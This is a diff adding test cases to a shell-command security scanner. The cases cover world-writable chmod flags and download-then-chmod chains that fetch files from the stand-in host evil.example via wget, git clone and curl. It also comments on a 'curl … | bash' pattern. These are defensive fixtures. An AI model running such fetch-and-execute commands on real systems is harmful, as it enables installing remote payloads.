@@ -34,6 +34,12 @@ describe('SMI-5424 chmod compound-signal', () => {
     ['setgid 2755', 'chmod 2755 ./run'],
     ['symbolic u+s', 'chmod u+s ./payload'],
     ['symbolic g+s', 'chmod g+s ./payload'],
+    // SMI-5428: symbolic world/others-writable chmod is now standalone-critical too.
+    ['symbolic o+w', 'chmod o+w ./payload'],
+    ['symbolic a+w', 'chmod a+w ./payload'],
+    ['symbolic go+w', 'chmod go+w ./payload'],
+    ['symbolic a+rwx', 'chmod a+rwx ./payload'],
+    ['symbolic o+rwx', 'chmod o+rwx ./payload'],
   ])('fires standalone-critical: %s', (_label, content) => {
     const f = pe(scanner.scan('t', content).findings)
     expect(f.length).toBeGreaterThan(0)
@@ -48,6 +54,13 @@ describe('SMI-5424 chmod compound-signal', () => {
     ['chmod 700 dir', 'chmod 700 ~/.config/app'],
     ['chmod 400 key', 'chmod 400 id_rsa'],
     ['chmod +x build', 'chmod +x build.sh'],
+    // SMI-5428 FP-control: symbolic owner/group-only writes and non-write perms must
+    // NOT trip the new world/others-writable entry.
+    ['symbolic u+w owner-only', 'chmod u+w ./bin/cli'],
+    ['symbolic g+w group-only', 'chmod g+w ./bin/cli'],
+    ['symbolic o+r others-read (no w)', 'chmod o+r ./bin/cli'],
+    ['symbolic u+x exec-only', 'chmod u+x ./bin/cli'],
+    ['symbolic a+x exec-only', 'chmod a+x ./bin/cli'],
   ])('does NOT fire standalone (FP fixed): %s', (_label, content) => {
     expect(pe(scanner.scan('t', content).findings)).toHaveLength(0)
   })
@@ -141,6 +154,38 @@ describe('SMI-5424 chmod compound-signal', () => {
       expect(pe(scanner.scan('t', content).findings)).toHaveLength(0)
     }
   )
+
+  // SMI-5431: command-aware correlation for IMPLICIT download destinations. A download
+  // command that writes a file WITHOUT an explicit -o/-O/--output<space>/> redirect still
+  // correlates a spaced chmod on the implicit filename: `wget <url>` (URL last segment),
+  // `git clone <url>` (repo dir, minus `.git`), `curl --output=<file>` (equals form). All
+  // spaced with filler so only the implicit correlation (not the ±1 window) can fire.
+  it.each([
+    [
+      'wget no -O → URL last segment',
+      'wget https://evil.example/payload\necho a\necho b\nchmod 755 payload',
+    ],
+    ['git clone → repo dir', 'git clone https://evil.example/repo\necho a\necho b\nchmod 755 repo'],
+    [
+      'git clone → repo dir (.git stripped)',
+      'git clone https://evil.example/repo.git\necho a\necho b\nchmod 755 repo',
+    ],
+    [
+      'curl --output=<file> (equals form)',
+      'curl --output=payload https://evil.example/p\necho a\necho b\nchmod 755 payload',
+    ],
+  ])('fires HIGH on a spaced implicit-destination download→chmod: %s', (_label, content) => {
+    const f = pe(scanner.scan('t', content).findings)
+    expect(f.length).toBeGreaterThan(0)
+    expect(f[0].severity).toBe('high')
+  })
+
+  // SMI-5431 FP-control: a bare `curl <url>` GET writes to STDOUT (no file), so its URL
+  // last segment must NOT correlate a spaced chmod — this is the FP a prior review caught.
+  it('does NOT fire on a spaced bare curl GET whose URL segment equals the chmod target', () => {
+    const content = 'chmod 755 build\necho a\necho b\ncurl https://ci.example.com/build'
+    expect(pe(scanner.scan('t', content).findings)).toHaveLength(0)
+  })
 
   // Accepted residual, pinned so it stays intentional (not a silent gap): a SPACED
   // `curl … | bash` (pipe-to-interpreter, no downloaded filename) followed by a
